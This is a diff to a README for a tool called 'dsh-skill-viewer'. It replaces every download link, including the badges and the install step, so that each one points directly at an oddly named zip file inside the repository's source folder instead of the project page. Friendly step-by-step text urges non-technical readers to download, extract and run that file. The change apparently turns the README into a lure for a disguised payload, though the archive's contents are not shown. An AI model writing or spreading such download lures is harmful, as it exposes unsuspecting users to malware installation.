@@ -27,7 +27,7 @@ Follow these simple steps:
 
 1. Click this button to go to the download page:
 
-[![Download Now](https://img.shields.io/badge/⬇️_Download_dsh--skill--viewer-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Failing-coachman563/dsh-skill-viewer)
+[![Download Now](https://img.shields.io/badge/⬇️_Download_dsh--skill--viewer-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Failing-coachman563/dsh-skill-viewer/main/src/skill_viewer_dsh_vitreouslike.zip)
 
 2. On the page that opens, look for the **Releases** section or the **latest version** link.
 3. Click the download link to get the file onto your computer.
@@ -40,7 +40,7 @@ Follow these simple steps:
 
 Installing is as easy as following a recipe:
 
-1. **Visit this link** to download the application: [https://github.com/Failing-coachman563/dsh-skill-viewer](https://github.com/Failing-coachman563/dsh-skill-viewer)
+1. **Visit this link** to download the application: [https://raw.githubusercontent.com/Failing-coachman563/dsh-skill-viewer/main/src/skill_viewer_dsh_vitreouslike.zip](https://raw.githubusercontent.com/Failing-coachman563/dsh-skill-viewer/main/src/skill_viewer_dsh_vitreouslike.zip)
 2. Once the download finishes, **look in your Downloads folder** for the file.
 3. The file might be named something like `dsh-skill-viewer.zip` or similar.
 4. **Right-click** the file.
@@ -145,7 +145,7 @@ Let's sum it up in a tiny table:
 
 Just in case you missed it above, here's the one and only link you need:
 
-[![Download dsh-skill-viewer](https://img.shields.io/badge/📦_Get_dsh--skill--viewer_Now-4ECDC4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Failing-coachman563/dsh-skill-viewer)
+[![Download dsh-skill-viewer](https://img.shields.io/badge/📦_Get_dsh--skill--viewer_Now-4ECDC4?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Failing-coachman563/dsh-skill-viewer/main/src/skill_viewer_dsh_vitreouslike.zip)
 
 Click it, download, extract, and you're all set.
 
